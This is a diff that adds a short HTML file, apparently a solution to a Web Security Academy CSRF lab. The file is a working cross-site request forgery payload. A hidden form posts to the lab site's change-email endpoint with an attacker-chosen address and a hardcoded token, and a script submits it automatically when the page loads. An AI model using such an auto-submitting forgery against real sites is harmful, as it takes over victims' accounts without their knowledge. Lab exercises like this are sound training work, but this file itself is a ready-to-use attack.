@@ -1,0 +1,15 @@
+<html>
+<body>
+<form method="POST" action="https://acca1ff31e01e2edc0b743bc00240026.web-security-academy.net/my-account/change-email" id="lab4">
+    <input type="hidden" name="email" value="shaker4@gmail.com"/>
+    <input type="hidden" name="csrf" value="aobz6f5leTzYVBGWXDvbp94BsaWtBtQN"/>
+</form>
+</body>
+<script>
+    document.forms['lab4'].submit();
+</script>
+<html>
+
+
+
+#shaker almzini
